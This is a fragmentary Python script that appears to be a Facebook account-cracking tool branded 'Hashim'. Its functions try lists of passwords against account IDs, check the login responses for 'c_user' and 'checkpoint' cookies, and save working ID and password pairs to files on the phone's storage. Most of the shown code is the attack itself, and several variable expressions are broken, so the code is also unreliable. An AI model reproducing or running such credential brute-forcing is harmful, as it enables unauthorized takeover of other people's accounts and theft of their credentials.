...
try:
	...
	os.system('python Hashim+AWAIS.py')
ugen = []
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/new').text
		ua=open('.bbnew.txt','w')
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> HASHIM  VERSION :\x1b[1;92m 1.0 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/Hashim+Hashim.txt')
				linex()
				...
				os.system('python Hashim+Hashim.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
			elif xd in ['4','04']:
				os.system(f'xdg-open https://www.facebook.com/voters.queen.7967747?mibextid=ZbWKwL');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Hashim] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SILENT+AWAIS:
				print('\r\r\033[1;31m[hashim-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/SILENT+Hashim-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SILENT+Hashim:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Hashim-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/hashim+Hashim-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Hashim] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SILENT+AWAIS:
				...
				open('/sdcard/jan+hashim-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
				...
				if 'y' in pcp:
					...
					open('/sdcard/m+Hashim-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mHashim\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[Hashim-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[Hashim-OK] '+cid+' | '+ps+'\33[0;97m')
